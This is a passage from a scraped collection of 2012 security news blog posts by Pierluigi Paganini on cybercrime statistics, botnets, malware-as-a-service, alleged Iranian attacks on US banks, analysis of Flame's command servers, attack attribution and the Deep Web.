security firms to make public data related the malware diffusion, providing useful information to private companies, CERTs of several countries and of course to the end users.\n\nIn September Symantec has published its report on cybercrime \u201dThe yearly Norton Cybercrime report\u201c, an interesting study on the evolution of  cyber criminal activities and their impact on the society. The report covers different technologies including and social networking and mobile reporting the impact on final customers in economic terms.\n\nThe impact of cybercrime is worrying with 556 million of victims per year, 2 on 3 adults have been victims of on line illegals in their lifetime, the total economic loss is 110 Billion with an average cost per victim of $197.\n\n\n\nFigure 1 \u2013 Global Price Tag of consumer cybercrime\n\nThe Asian region is the most affected by cybercrime, the global pricetag of consumer cybercrime for China amounts to 46 Billion , followed by US with 21 Billion and European Area with 16 Billion.\n\nThe highest numbers of cybercrime victims were found in Russia (92 percent), China (84 percent) and South Africa (80 percent). The technologies that have suffered the major increase in cybercrime are social networking and mobile, mobile users are very vulnerable to attacks, 1/2 adults use a mobile device to access the internet and the mobile vulnerabilities doubled in 2011 respect previous year.\n\n44% of users aren\u2019t aware of the existence of solutions for mobile environments, and 35 of adults have lost their mobile device or had it stolen. Of particular concern is an improper use of social networks, wrong management of sessions, absence of validation of visited links and a total ignorance of any security setting expose users to fraudulent activities.\n\n15 percent of users have had their account infiltrated, and 1 in 10 have been victims of fake links or scams.\n\nThe report confirms that cybercrime industry is an factory that has no crisis and that moves amounts of money comparable to the economical revenue of a State.\n\nOne of the most dangerous threat for internet users and also for institutions that expose their services on the web are the botnet, millions of infected computers synchronized to conduct an attack against a specific target.\n\nIn the classic architecture each machine, named bot, executes orders sent by a master unit called bootmaster, which can instruct the various components of the malicious network to perform an attack rather than exchange communication messages. The model of botnet could be used for various scopes, in military as cyber weapon, in industry for cyber espionage, in cybercrime to steal sensible information such as banking credentials.\n\nThe infection phase that represents the recruiting of the machines due the diffusion of different types of malware developed with specific and profoundly different characteristics. The most common way to build a botnet is to send the victims infected mails, containing link to compromised web site or that have attacked the malware agent that once executed on the machine it transforms it in a bot.\n\nUsually the infected machines try to contact the C&C (Command & Control) servers to receive operative instructions, botnets represent one of the most dangerous cyber threats due their adaptive capabilities and the massive diffusion. Recent events have demonstrated that every platform could be attacked, one of the latest and most aggressive malware is Flashback Trojan, a malware created to conduct click fraud scam by hijacking people\u2019s search engine results inside their web browsers, stealing banking or login credential. Of course once infected the system it could be used as part of a botnet causing bigger damages.\n\nMcAfee Labs proposed an interesting analysis on the phenomenon in McAfee Threats Report \u2013 First Quarter 2012 that illustrates the cyber threat botnet is growing creating great concern between security experts due their diffusion, millions of compromised computers connected to the Internet are in fact daily used to realize scam and cyber attacks. Security firms tracking the volume of messages exchanged between bots and command servers are able to examine the level of infection of the malicious agents. Overall messaging botnet growth jumped up sharply from last quarter, mainly in Colombia, Japan, Poland, Spain, and the United States.\n\n\n\nFigure 2 \u2013 Global Botnet Infections\n\nBehind the principal botnets there is the cybercrime industry that is pushing on the diffusion of malware to infect an increasing number of machines, but also proposing new models of business, such as botnet rental or the commerce of the agents for botnet creation. The business is reaching important figures in a short time mainly due to the opportunities provided by the Deep Web.\n\nIn the last months experts of the AlienVault firm discovered a new service that offers cyber-attack tools and hosting as part of malware-as-a-service.  Once again cybercrime operates as enterprise, the products proposed are tools for the organization of cyber attacks such as spam of malware, malware hosting, and a to build up a complete command and control infrastructure (C&C) for the arrangement of botnets.\n\nThe service is called Capfire4 and it\u2019s a good example of C2C (Cybercrime to Cybercrime), it provides technological support to criminals who haven\u2019t necessary knowledge to conduct a cyber attack or to arrange a cyber scam.\n\nIn the simplest way, users can access to a Web portal that offers the possibility to create customized version of malware, controlling the malicious architectures through a friendly management console to coordinate the bots.\n\nFew steps for criminal that need to create a botnet without having particular knowledge.\n\nBut Botnet creation is not only a prerogative of cybercrime, it is also considered in cyber warfare scenario as a military option for offensive purposes or cyber espionage. Deploying a botnet it is possible to attack the nerve centers of a country, isolated attacks can target its critical infrastructures, create serious problems in areas like finance, communications and transport. That is cyber warfare, no matter if behind the attack there is a foreign government or ruthless criminals, the risk is high and face the threat has high priority.\n\nThe US government is taking in serious consideration the cyber threat related to the botnet, recently administrative officials belonging to U.S. President Barack Obama\u2019s team declared that the government had started IBG (Industry Botnet Group) a coordinated project that involves private enterprises and trade units.\n\nOne of the key features of the program is the increasing of the level of awareness on the botnet world through the cooperation of government and private sector.\n\nDespite cyber space is known as a domain without borders, many studies have demonstrated that cyber criminal activities are mainly located in some area of the planet, as we can see also the victims of the attacks have a geographical features that make them attractive targets. Kaspersky Security firm has in a recent reports illustrated that factors such as the economic level of a country, its Internet population and the security level of the nation concur to define a geography of attacks. These countries present sufficient security mechanisms to defend users and also the computer system used are often equipped with last versions of operating systems  that  incorporate mechanisms to prevent cyber attacks. According the Internet World Stats  the level of Internet penetration in US and Europe is very high, internet users in these areas actively use online services  and cards associated with their banking accounts to pay for goods online:\n\nHaving to deal with advanced and updated defense systems the crime industry is increasing the level of sophistication of attacks developing new technologies, mainly with the principal intent to make money.  The Trojan spread are mainly used with the purpose of deliver or hide malicious agents or to steal sensible information with specific reference to banking sector.\n\n \n\nFigure 3 \u2013 Trojan classification\n\nThe sector mainly attacked by cybercrime is the financial / banking in which the incidence of theft of information is high, some examples of malware known to chronicle are Zbot (ZeuS) and SpyEye, both are universal Trojans which targets the accounts of many banks and also e-pay services such as PayPal and E-bay, let\u2019s remind that usually these accounts are linked to bank accounts and are considered privileged targets,  34% and 9% respectively of all phishing attacks target them.\n\nTo have an idea of the of the business and of related profits in 2010 arrested stole $9 million from more than 600 accounts in three months using Zbot. The most effective vector of attacking European and American users is still internet in the first half of 2012, 80% of all infected computers were attacked in this way, Italy and Spain are the most hit countries.\n\nThe criminals use to compromise user\u2019s machine in one of the following mode:\n\nFigure 4 \u2013 percentage of users exposed to Internet attacks (H1 2012)\n\n The percentage of users exposed to Internet attacks (H1 2012):\n\nFrom the research is emerged also another interesting result, despite in Western Europe, Canada and US there is a strong legal basis for combating malicious content hosted on web site, 69% of infected code was hosted on servers located in these regions in the first half of 2012 corresponding to over the half of the malicious programs on the Internet.  The figures are not surprising, the majority of data centers providing failsafe hosting are located in these areas and usually cybercriminals and hackers compromise such servers to obtain reliable hosting that host legal sites, making hard their identification from an user\u2019s perspective. The report reveals that domain zones .net, .com, .info and .org. account for 44.5% of repelled attacks that were launched from malicious web sites on users located in North America and Western Europe.\nUsers from the US, Canada and Western Europe are typically redirected to sites located in the domain zones of India (.in), Russia (.ru) and the Cocos Islands (co.\u0441\u0441).\n\nDespite the level of alert of private companies, governments and security firms is high the incidence of cyber threat is still too high, this is possible due the increasing level of complexity of malware agents.\n\nMeantime worldwide security expert are searching for a common strategy to decapitate the botnets, the cybercrime industry is providing new efficient solution to avoid any type of detection and mitigation.\n\nWe have different innovative factors in the menace moved by malware and botnet creators, such as new modular and destructive malicious agent and also new botnet based on the P2P (peer to peer) communication protocol that not relies on command and control (C&C) servers for receiving commands. The interesting feature is that P2P communication is used as a backup system in case the C&C servers are not reachable, creating an autonomous peer networks in which each node can operate as a slave or as master giving orders to other PC operating and exchanging information acquired illegally by the victims.\n\nThe major concern of security experts is related to the capabilities of many of these agents to exploit zero days vulnerabilities that make practically impossible the detection of the agents. But it\u2019s dangerous justify the success of the attacks only to the exploit to unknown vulnerabilities, in many cases well known vulnerabilities are exploited due the absence of an appropriate update of the systems.\n\nThe Zeus case is not isolated, recently Kaspersky Lab, in collaboration with CrowdStrike Intelligence Team, Dell SecureWorks and members of the Honeynet Project, dismantled the second Hlux botnet (aka Kelihos).\n\nThis botnet had scary size, it has been estimated it was three times larger than the first botnet Hlux / Kelihos dismantled in September 2011. After only 5 days from the transaction, Kaspersky Lab had already neutralized more than 109,000 infected hosts. It is estimated that the first botnet Hlux / Kelihos had only 40,000 infected systems.\n\nThe event has demonstrated that it is becoming hard to tackle new generation of botnets, due the usage of the peer-to-peer technology also implemented in Kelihos. The new variant of malware incorporates P2P technology to eliminate the need for a C&C server, avoiding detection and the immunization campaigns to decapitate the malicious networks.\n\nAnother interesting improvement proposed by the cybercrime industry is the use of Tor networks is the botnet architecture as discovered in September 2012 by the German security firm G Data Software that has detected a botnet with a particular feature, it is controlled from an Internet Relay Chat (IRC) server running as a hidden service of the Tor. Despite similar choice presents some technical problems related to the latency of the Tor networks and the implicit difficulty to control the botnet, the advantage is the difficulty of localize the command and control servers, due the encryption of the connections interior to the network and the unpredictability of the routing of the information.\n\nThe challenge between security firms and attackers is open and it is fundamental to keep high the effort in the detection and fight of cyber threats to avoid dramatic consequences.\n\nAre our defense systems adequate to reply to incoming cyber threats?\n\nUnfortunately in many cases the cyber threats present a level of complexity that make possible to avoid common security measures. The security firm FireEye has released  a report  named \u201cAdvanced Threat Report\u201d related first half of 2012 that provides an overview of the current threat landscape, evolving advanced malware and advanced persistent threat (APT) tactics, and the level of infiltration seen in organizations\u2019 networks today.\n\nThe report presents and alarming scenario, the organizations are assisting to an impressive increase in advanced malware that is bypassing their traditional security defenses.  In these days we are reading a lot of news on agents that are able to elude common defense mechanisms, problem that is afflicting across all sectors, from defense to energy.\n\nThe organization are facing with a dramatic explosion of the diffusion of advanced malware in terms of volume and also in effectiveness in bypassing traditional signature-based security mechanisms.\n\nA statistic proposed by the security firms report that on average, organizations are experiencing a staggering 643 Web-based malicious events each week, incidents that have as results the impairment of final targeted systems.  This figure includes file-based threats, such as malicious executables or files that contain exploit s targeting vulnerabilities in applications, that are delivered over the web and email. The figures does not include callback activities, very common on the web.\n\n\n\nFigure 5 \u2013 Web Infection Per Week per Company\n\nThe graph show the abnormal increase registered in the first half 2012 that is greater than the number of infection per week of the entire last year, the patterns of attacks vary substantially by industry, in particular the sector of healthcare and Energy/Utilities increased respectively up 100%, and up 60% .\n\nThe fight against the proliferation of botnets and more in general of any kind of malware goes through some key factors such as:\n\nDespite the great effort and the increasing investments made by government and private company  many sectors still suffer the attacks of cybercrime, the situation in worrying because in many cases the cyber threats do undetected causing serious damages. As demonstrated by the provided data the number of compromised machines and infrastructures is increasing despite the adoption of security countermeasures.\n\nAnother fundamental step in the fight of malicious agent is the definition of a global agreement and the of a global strategy against cybercrime and a regulatory on the use and diffusion of any kind of cyber tool by government agencies, both on legislative and operative perspectives \u2026\n\nIn the meantime the cyberspace is still too crowded!\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/davinci", "topic_name": "DaVinci"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-web", "topic_name": "Deep Web"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/finfisher", "topic_name": "FinFisher"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networking", "topic_name": "social networking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-days-vulnerabilities", "topic_name": "zero days vulnerabilities"}]}, {"news_name": "Expected new wave of cyber attacks against banking", "news_link": "https://securityaffairs.co/wordpress/8907/cyber-crime/expected-new-wave-of-cyber-attacks-against-banking.html", "title": "Expected new wave of cyber attacks against banking\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 25, 2012", "body": "In these days it has been discussed about a possible Iranian cyber offensive against US banks immediately denied by government of Teheran, the event raised the discussion on the real level of security of banking systems.\n\nFinancial institutions are considerable privileged targets for a cyber attacks, banking system is a critical asset for a nation and its paralysis could damage economic activities.\n\nUnder these premises it\u2019s simple to understand the need to address banking in the cyber strategy of every country, it\u2019s fundamental to protect financial institutions thanks to a strict collaboration between them and governments agencies.\n\nThe failure of the this collaboration could exposes to risks to homeland security, that is exactly what is happened in US where financial services institutions don\u2019t haven\u2019t informed law enforcement about having been victimized by cyber attacks.\n\nThe news has been provided by a top Department of Justice official after the observed attacks against Bank of America and JPMorgan Chase.\n\nIn US all states have adopted laws requiring that companies victims of incident to notify information to their customers in order to proper response to the event. Recently, Senate Republicans have introduced draft legislation known as the \u201cData Security and Breach Notification Act of 2012 (S.3333)\u201d to propose a national recognized procedure to respond to data breaches.\n\nGovernments networks are privileged targets for several type of attackers, foreign state-sponsored hackers, hacktivists and cyber criminals are increasing the frequency of the attacks, mainly with cyber espionage purpose, to expose government information or to steal intellectual properties in critic sectors such as the defense.\n\nDoug Johnson, vice president of risk management policy for the American Bankers Association and a member of FS-ISAC, is convinced that we will assist to an increase of cyber attacks against banking sector, banks of all sizes should prepare now for increasing offensive.\n\n\u201cThey could be subject to a threat,\u201d he says.\n\nLanny Breuer, assistant attorney general for the department\u2019s criminal division, defined cybercrime one of the most serious threats to national security declaring :\n\n\u201cis so hard to get a handle on because a lot of it is perpetrated by those working abroad who are skilled at what they do, and the anti-virus software most of us use only protects us from known vulnerabilities.\u201d\n\nSophisticated malware and botnets are threatening principal computer networks of all sectors, mainly the banking one, and it is very hard to distinguish state-sponsored attacks from cyber criminal offensives.\n\nThe concern for the wave of cyber attacks is high, consider that The Financial Services Information Sharing and Analysis Center, an industry security group has recently raised its threat level for cyber attacks to \u201chigh\u201d from \u201celevated.\u201d\n\nSerious repercussions could also be observed on the user\u2019s perspective, the discovery of continuous vulnerabilities in tools such as web browsers requires great attention by the customers that have to keep updated their systems also thanks to a prompt alerting services of the banks.\n\nThe fear of being victims of computer fraud could turn away the user from online services with a major impact on banks, that\u2019s why financial institutions are introducing new technologies to protect user  such as multi purpose authentication tokens and hardened browsers.\n\nTo complicate the scenario is the recent and rapid introduction of financial services available on social network platforms and on mobile environment, both suffer leak of security and poor awareness level of their user creating favorable conditions for cyber crimes.\n\nBreuer also highlighted the difficulty to conduct investigations on crimes for the nature itself of the events that occur in limited time and for the impossibility to collect clues respecting privacy rights that delay the collection of evidences after a cyber attack.\n\nLet\u2019s consider for example that Internet Service Providers (ISPs) are not obliged to retain their data for any specific amount of time and if investigation are not conducted immediately after the incident in many cases it is impossible to access to useful data.\n\nHow to mitiate risks?\n\nIt\u2019s desirable a joint commitment of banking institutes, governments and also the customers.\n\nBanking institutes must understand that we are in the cyber war era and they are privileged targets for cybercrime and state-sponsored attacks.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/authentication", "topic_name":

Western countries are always in the principal news, the fear for an imminent Israel attack raises many questions regarding the real level of military preparedness of the regime.\n\nMany experts have tried to analyzed a possible scenario of the attack, in which the cyber component could assume a strategic importance.\n\nA massive cyber attack could open the hostilities, anticipating a conventional strike, but the Government of Teheran is showing a great awareness of the risks related to a cyber attack and it has started a massive propaganda campaign trying to show to the western world its cyber capabilities.\n\nLast week the U.S. national security officials announced to the press that the real origin of the attacks against financial institutions such as  JPMorgan-Chase and Bank of America was Iranian cyber warfare.\n\nThe banks were hit by DDoS attacks that caused problems to the website of the companies, in a first time the security experts blamed groups of hackers representative of the Islamic movements in the struggle against the distribution of a profane video ridiculing Prophet Mohammed that has caused clashes in recent days.\n\nDespite the attacks have been claimed on line with statements that accuse the \u201cproperties of American-Zionist Capitalists,\u201d and announcing further cyber operations the report states that according to a former U.S. cyber-security official  the U.S. is aware on a possible attacks against its infrastructures.\n\nFrank Cilluffo, who served at the White, during Bush government, as Special Assistant to the President for Homeland Security, declared\n\n\u201cthe government of Iran and its terrorist proxies are serious concerns in the cyber context. What Iran may lack in capability, it makes up for in intent. They do not need highly sophisticated capabilities \u2013 just intent and cash \u2013 as there exists an arms bazaar of cyber weapons, allowing Iran to buy or rent the tools they need or seek.\u201d\n\nLet\u2019s remind the Iran was subject by a series of state-sponsored attacks, it was hit by the cyber weapon Stuxnet and by a serious of cyber espionage malware such as Duqu and Flame, making the Iranian government very reactive under cyber warfare perspective.\n\nThe accusations of the U.S. government have generated an immediate response from Tehran which has refused liability in the attacks.\n\nHead of Iran\u2019s Civil Defense Organization Brigadier General Gholam Reza Jalali has confirmed to the Persian service of the Fars News Agency that the Islamic Republic has never launched any cyber attack on U.S. banks.\n\nThe Iranian official is convinced that claims are simple justifications for ongoing cyber attacks against his country. The Iranian official also provided further regarding the cyber capabilities of the country declaring that the government is working to protect critical infrastructures of the country\n\n\u201cWe can say that our nuclear systems are vaccinated against such cases (computer viruses and malwares),\u201d \n\n\u201cThe Stuxnet virus was used to hinder our nuclear activities for two years but we see in practice that our activities in this field continue successfully.\u201d \n\nJavadi said that the indigenous anti-virus is actually able to detect the virus such as Stuxnet and Flame and to clean up the infected computers.\n\nLast April Iranian oil sector had experienced with a series of cyber attacks that also hit  the country\u2019s Oil Ministry, cyber offensive that according Hamdollah Mohammadnejad, deputy minister in engineering affairs were immediately contained.\n\nHow Iran is preparing itself to a cyber attack?\n\nGovernment is launching the initial phases of a national internet, a countrywide network aimed to host all sensible services run through the world wide web, Ali Hakim-Javadi , deputy communications and technology minister, announced through the Mehr news agency:\n\n\u201cIn recent days, all governmental agencies and offices \u2026 have been connected to the national information network,\u201d\n\nThe internal network would be completed within March 2013 and it\u2019s not clear if the access to internet will be completed interdicted.\n\nMillions of websites proposing contents not aligned with the government\u2019s policy are blocked by Iranian authorities and it\u2019s not first time that the regime is controlling internet access.\n\nCommunications and Technology Minister Reza Taqipour declared:\n\n\u201cEspecially on major issues and during crises, one cannot trust this network at all,\u201d he said, referring to the global Internet.\n\n\u201cControl over the Internet should not be in the hands of one or two countries.\u201d\n\nThe government is creating its own network to secure the Regime\u2019s sensitive data and infrastructures isolating them from internet to avoid cyber attacks. Recently the Government has also announced to desire to block access to Google and Gmail service in reaction to the anti-Islam film that has sparked outrage inside the Muslim world.\n\nAnalyzing Tor network metrics is possible to discover how many users are trying daily to avid censorship using anonymizing services, the blue plot indicate the possible presence of control action.\n\n\n\nThe block has been applied since last night but there is no indication as to whether the filtering would be temporary or permanent.\n\n\n\nThe rumors that are surrounding the Iran, demonstrating the high tension between the country and Western coalition, can trigger a spiral of actions in the real world as in the cyber space, which could have global repercussions in economic terms. Iran is one of the largest oil producers in the world and the global economic crisis could worsen if the state was attacked.\n\nIran has already warned that oil shipments through the strategic Strait of Hormuz will be in jeopardy in case of conflict, due this reason is reasonable to be expected an intensify  of covert cyber offensive from both sides.\n\nThe situation is extremely delicate but I don\u2019t believe in an imminent conventional strike.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil", "topic_name": "Oil"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Analisys on Flame C&C, the cyber war began long ago", "news_link": "https://securityaffairs.co/wordpress/8787/intelligence/analisys-on-flame-cc-the-cyber-war-began-long-ago.html", "title": "Analisys on Flame C&C, the cyber war began long ago\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 18, 2012", "body": "In May Iranian Computer Emergency Response Team Coordination CenterLab,  CrySyS Lab and Kaspersky Lab have published a news regarding a new malware that has been detected and that have hit mainly Windows systems of Middle East area, specifically the Iran.\n\n\n\nThe malware was evidence of a huge ongoing cyber espionage campaign, the level of complexity and the targeted area led immediately to think of a state-sponsored operation, the various level of encryption present in the agent led Kaspersky team to seek help from experts cryptographers.\n\nThe investigation conducted by Kaspersky team demonstrated a link between Stuxnet and Flame, confirming the hypothesis that the groups of developers of the projects had the opportunity to collaborate and the creation of the detected Flame.\n\nThe team of Kaspersky has joined the Symantec, ITU-IMPACT and CERT-Bund/BSI to perform further analysis on the powerful cyber espionage tools detected.\n\nAn accurate forensic analysis of the command & control servers revealed an additional three unidentified pieces of malware under the control of the attackers, but the alarming discovery is related to an alleged agent still in the wild.\n\nAnother surprising revelation is the dating of the first use of Flame, initially thought to have begun in 2010, that appeared to be 2006.\n\nThe C&C servers discovered were owned by a European company with data centers in another European Union country.\n\nThe group of security analysts gets a server image which was an OpenVZ file-system container, an operating system-level virtualization technology based on the Linux kernel and operating system.\n\nOpenVZ allows a physical server to run multiple isolated operating system instances but it made forensic analysis difficult.\n\nThe study demonstrated that the authors of malware have intentionally tried to cover tracks of their operations providing fake clues to disorient the analysts, for example, the C&C servers presents an elementary structure and look and feel to give the impression that it had been prepared by script kiddies, equipped with a simple and anomalous botnet control panel.\n\nThe bots don\u2019t receive in fact the command directly by the console but attackers uploaded special crafted tar.gz archives containing scripts that were processed by the server.\n\nThe server extracted script from the archive looking for *.news and *.ad files located in specific directories, priority and target client ID were stored in the filename uploaded to a C&C server with the following convention\n\n<random_number>_<user_type>_<user_id>_<priority>.<file extension>\n\nGoing deep in the code analysis the researchers discovered that C&C server was able to use different communication protocol probably used to \u201cconverse\u201d with different clients. The protocol discovered are named:\n\nFour protocol dedicated to four different types of malware SP, SPE, FL and IP where FL stands for Flame and according to the code analyzed the remaining clients are similar agents.\n\n\n\nIf Flame has been detected what\u2019s about the remaining agents?\n\nRedirecting the Botnet traffic to a \u201csinkhole,\u201d to oversee traffic from infected machines and prevent further distribution of malware and scams the researchers have distinguished two different streams of data respectively related to Flame and to another the SPE malware client demonstrating that it is operating in the wild.\n\nThe security experts have provided interesting data on the traffic directed to the C&C server, starting on March 25th, during a week, 5377 unique IP addresses connected to the server located in Europe, 3700 connections were originated from Iran and around 1280 from the Sudan.\n\nLess than 100 connections were made from other countries such as the United States, Germany, and India, region targeted and a number of infection related to specific countries gives an indication of a state-sponsored intelligence operation conducted against Iran and Sudan.\n\n\n\nAccording to Alexander Gostev, chief security expert at Kaspersky Lab, it has been discovered a cyber espionage campaign conducted on large scale.\n\nOne of the most valuable traces left by the 4 developers in the scripts were their nicknames and internal timestamps, the earliest of which is dated Dec. 3, 2006.\n\nSingular that one of the developers has worked on a majority of the files demonstrating the great experience, maybe the developer was the team leader according to the report.\n\n\u201cHe coded some very smart patches and implemented complex logics; in addition, he seems to be a master of encryption algorithms. We think [developer] was most likely a team lead,\u201d \n\nstates the study\n\nOther interesting info discovered from the analysis of the C&C servers are the last modification date that is May 18th and the presence of an automated scripts used to delete log files and disable logging function. The researchers have found a shred tool also used by the Duqu team was used to wipe information and also some scripts that downloaded new data and removed old data every 30 minutes.\n\nThe analysis of the security experts revealed that the projects started earlier than 2010 contrary to when believed, highlighting the great complexity of the encryption used, the gathered information by malware, in fact, are encrypted on the server and only the attackers can read.\n\nFlame was just a part of a state-sponsored project, it\u2019s quite possible that similar projects are still ongoing and what is singular in my opinion is the ability to remain hidden during a long period, characteristics that make these agents really dangerous .. the cyber war began long ago.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Flame, cyberespionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/middle-east", "topic_name": "Middle East"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-operation", "topic_name": "state-sponsored operation"}]}, {"news_name": "State-sponsored attack or not, that\u2019s the question", "news_link": "https://securityaffairs.co/wordpress/8765/intelligence/state-sponsored-attack-or-not-thats-the-question.html", "title": "State-sponsored attack or not, that\u2019s the question\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 18, 2012", "body": "The defense of cyberspace is becoming one the most concerning question to approach, governments all around the world are massively investing in cyber technology with the resultants that the number of cyber operations is increasing exponentially.\n\nWilliam J. Lynn, U.S. Deputy Secretary of Defense, states that:\n\n\u201cas a doctrinal matter, the Pentagon has formally recognized cyberspace as a new domain in warfare . . . [which] has become just as critical to military operations as land, sea, air, and space.\u201c\n\nThe message launched by official demonstrates the high interest of government in the development of cyber warfare capabilities oriented to cyber espionage and cyber offensive.\n\nDespite the potential effects of the use of cyber weapons and the damage caused by offensive operations represent major concerns for intelligence agencies, very frequently are discovered clues of cyber attacks that have the main purpose to steal sensible information and intellectual property from the victims.\n\nWho is behind these cyber attacks?\n\nAnalyzing the statistics it is possible to note that the majority of attacks are related to hacktivism and cybercrime activities, the data demonstrate a growing trend for cyber warfare attacks but it is expected that they represent only the tip of the iceberg.\n\n\n\n\nTo identify a cyber attacks is becoming every day more and more difficult, in my previous post I presented a study released  by the security firm FireEye, named \u201cAdvanced Threat Report\u201d related first half of 2012, that provides an overview of the current threat landscape, evolving advanced malware and advanced persistent threat (APT) tactics, and the level of infiltration seen in organizations\u2019 networks today.\n\nThe document presents and alarming scenario, the organizations are assisting to an impressive increase in advanced malware that is bypassing their traditional security defenses.\n\nIt\u2019s quite common to assist that a malicious agent is able to elude common defense mechanisms remaining stealth for long period in which it operates under coverage.\n\n\n\nThe problem is mainly related to cyber espionage activities and its impact in any sectors, from defense to communication, causing serious damages.\n\nWe are not able today to exclude that a cyber weapon is operating undetected and it is known that at least 140 countries are working on the development of new agents that will crowd cyber space soon.\n\nThe organization are facing with a dramatic explosion of the diffusion of advanced malware in terms of volume and also in effectiveness in bypassing traditional signature-based security mechanisms. Most of these attacks are considered as state-sponsored due the nature of the targets systems and the abilities of the malicious agents to exploit 0-days vulnerabilities.\n\nMost state-sponsored malware are designed for activities such as data-gathering, cyber espionage or sabotage, we have a large casuistry on features identifies in the malicious agents, but the same scope are persecuted by cybercriminals and hacktivists.\n\nDistinguish the origin of attacks is not simple, in many cases the cybercriminals operate exactly in the same way state-sponsored hackers do, selecting specific sector as privileged target and operating with malware that mainly act in stealthy mode.\n\nWe must consider also the cybercrime is not always considerable a totally separated cyber threats, cyber criminals operate in the name of business and they steal sensible information to sell them to hostile countries.\n\nAccording Myla Pilao, director of core technology marketing at Trend Micro\u2019s TrendLabs, the attacker\u2019s intent is fundamental to discriminate a cyber attacks from a state sponsored operation, and let me add also that the context of operation and the real identity of the attacker have the same importance.\n\nWhat make more hard the identification of the origin of attacks is the consideration that in the cyber space there are no boundaries and an offensive could be started from a domain associated to any countries.\n\nIndications on the presence of a state-sponsored attack are related to the target addressed and the region where the agent has counted the greater number of infected host, let\u2019s think for example to Flame that hit mainly Middle Eastern countries with cyber espionage intents or Stuxnet that concentrated its efficacy against Iranian nuclear plants.\n\n\n\nThe limited geographic area could highlight the presence of an ongoing intelligence campaign interested in gathering sensible information and conducting espionage.\n\nPhil Lin, director of product marketing at FireEye, noted:\n\nStill, all of these characteristics can also be found in advanced malware used by cybercriminals for regular attacks, which makes the geographical attribution of cyberattacks \u201cthe most difficult task\u201d, Lin observed.\n\n\u201cCybercriminals from one country can easily set up \u2018command and control (C&C)\u2019 servers used to store exfiltrated data in a different country leading to incorrect attribution of the nationality of the threat actors, not to mention their ultimate nation-state ties,\u201d\n\nThe level of complexity of the agent used could be a condition necessary but not sufficient to qualify the product of a state sponsored project.\n\nMy opinion is that despite a deep analysis on the victims of the attacks in many cases it\u2019s hard to find evidences of a state involvement due the increased sophistication of the malware, powerful agents that are able to destroy their tracks.\n\nIn the future the number of operations has will increase and it is \u201cextremely unlikely\u201d that in absence of an international regulatory in cyber warfare a country will openly admit sponsoring operation.\n\nThe only escape way that I see is the definition of a regulatory because I am convinced that, in the absence of strict rules, technical capabilities of the states will evolve in an unpredictable manner and it will impossible to qualify the nature of malicious code and to discover the identity of its creators.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link":

Invisible web) is the set of information resources on the World Wide Web not reported by normal search engines, according a raw estimation of some security experts clear web represents only a small portion of the overall web content, the remaining part is unknown to the majority of web users.\n\nOrdinary web users are literally shocked when understand the existence of the Deep Web, a network of interconnected systems, not indexed, having a size hundreds of times higher than the current web, around 500 times.\n\nTo explain the Deep Web I use to cite the definition provided by the founder of BrightPlanet, Mike Bergman, that compared searching on the Internet today to dragging a net across the surface of the ocean: a great deal may be caught in the net, but there is a wealth of information that is deep and therefore missed.\n\n\n\n \n\nWho and why could be interested in the Deep Web? Is the Deep Web the reign of cybercrime? Is it legal surf in anonymity?\n\nProfessionals have several advantages to surf through Deep Web and the conviction that it represents a parallel world of illicit activities is profoundly wrong.\n\nLet\u2019s start with the consideration that illicit activities are daily arranged on clear web such as in the Deep Web, in many cases we have read of platforms used to spread and sell malware on the ordinary web and we all know that is quite simple to find any kind of objects, also illegal, on the clear web.\n\nBut what primarily distinguishes the clear web from the Deep Web? Of course, when we speak of hidden web we can think of a dark world characterized by the possibility to surf, under specific conditions, in total 